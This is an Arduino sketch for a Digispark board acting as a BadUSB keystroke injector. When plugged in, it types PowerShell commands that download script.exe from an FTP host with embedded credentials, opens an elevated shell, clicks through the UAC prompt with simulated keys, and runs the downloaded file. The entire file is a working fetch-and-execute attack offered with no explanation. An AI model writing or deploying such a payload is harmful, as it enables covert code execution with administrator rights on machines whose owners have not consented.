#include "DigiKeyboardDe.h"   


void setup() {
  DigiKeyboardDe.delay(3000);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboardDe.delay(200);   
  DigiKeyboardDe.println("powershell"); 
  DigiKeyboardDe.delay(1000); 
  DigiKeyboardDe.println("$file = \"C:\\Users\\admin\\script.exe\"");  
  DigiKeyboardDe.delay(200); 
  DigiKeyboardDe.println("$webclient = New-Object System.Net.WebClient");  
  DigiKeyboardDe.delay(200);  
  DigiKeyboardDe.println("$uri = New-Object System.Uri(\"ftp://testuser:testuser@192.168.178.22/script.exe\")"); 
  DigiKeyboardDe.delay(200);  
  DigiKeyboardDe.println("$webclient.DownloadFile($uri, $file)"); 
  DigiKeyboardDe.delay(200);  
  DigiKeyboardDe.println("start-process powershell -verb runas"); 
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT );
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.println("cd C:\\Users\\admin");
  DigiKeyboardDe.delay(200);  
  DigiKeyboardDe.println("./script.exe");
  
}

void loop() {
}
